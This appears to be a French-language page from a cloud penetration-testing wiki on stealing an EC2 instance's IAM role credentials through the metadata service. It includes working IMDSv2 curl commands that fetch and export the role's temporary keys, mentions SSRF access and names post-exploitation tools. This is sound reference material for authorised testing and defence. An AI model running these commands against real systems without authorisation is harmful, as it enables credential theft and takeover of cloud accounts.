---
order: 2
title: "Profil d'instance : voler le rôle EC2 via le service de métadonnées"
description: "Récupération des identifiants du rôle via le profil d'instance depuis le service de métadonnées pour agir en tant que rôle EC2."
keywords:
  - profil d'instance
  - identifiants de rôle
  - IMDS
  - EC2
  - métadonnées
---

# Profil d'instance

Le **profil d'instance** d'une instance EC2 encapsule un rôle IAM, et le service de métadonnées de l'instance (IMDS) remet les identifiants temporaires de ce rôle à tout ce qui s'exécute sur la machine. L'exécution de code sur une instance, ou une falsification de requête côté serveur (SSRF) qui atteint l'IMDS, revient donc à devenir le rôle de l'instance, ce qui constitue l'un des points d'ancrage les plus courants dans AWS.

## Récupération des identifiants

```bash
# IMDSv2: get a token, then the role name, then its credentials
TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
```

Exportez les valeurs retournées `AccessKeyId`, `SecretAccessKey` et `Token` et vous êtes le rôle de l'instance.

## Notes d'exploitation

- Le détail de la récupération via l'IMDS, y compris la différence entre IMDSv1 et IMDSv2 et l'accès à l'IMDS par SSRF, est traité dans [identifiants : métadonnées d'instance](../../credentials/instance-metadata/index.md).
- Les identifiants de rôle issus de l'IMDS sont de courte durée mais renouvelés automatiquement tant que l'instance tourne ; récupérez des copies fraîches au besoin plutôt que de les mettre en cache.
- Associez immédiatement l'[énumération](../../identity/enumeration.md) : le premier appel en tant que nouveau rôle devrait être `sts:GetCallerIdentity` et le mappage des permissions.

## Outils

- **curl** contre `169.254.169.254` : la récupération brute.
- Enveloppes de type **Pacu** / **NetExec** : automatisent le vol via l'IMDS pendant la post-exploitation.

## Références

- [AWS: retrieve instance metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
- [HackTricks Cloud: IMDS and the EC2 role](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/index.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
